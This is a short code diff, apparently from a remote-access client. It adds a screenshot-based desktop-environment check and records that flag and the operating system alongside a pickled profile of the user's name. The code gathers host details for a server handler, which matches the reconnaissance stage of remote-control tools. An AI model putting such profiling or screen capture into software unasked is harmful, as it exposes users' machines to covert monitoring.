@@ -1,7 +1,16 @@
 import getpass, requests, socket, pickle, loguru, time
 import platform
 
+from PIL import ImageGrab
 from core.handler import ServerHandler
+
+def checkDesktopEnvironment() -> bool:
+    try:
+        ImageGrab.grab()
+        return True
+
+    except OSError:
+        return False
 
 deviceProfile: list[str] = [
     getpass.getuser(),                              # Username
@@ -10,7 +19,8 @@ deviceProfile: list[str] = [
 ]
 
 additionalData: dict = {
-    "Operating System": platform.platform()
+    "Operating System": platform.platform(),
+    "Desktop Environment": '0' if checkDesktopEnvironment() else '1'
 }
 
 compressedData: bytes = pickle.dumps(deviceProfile)
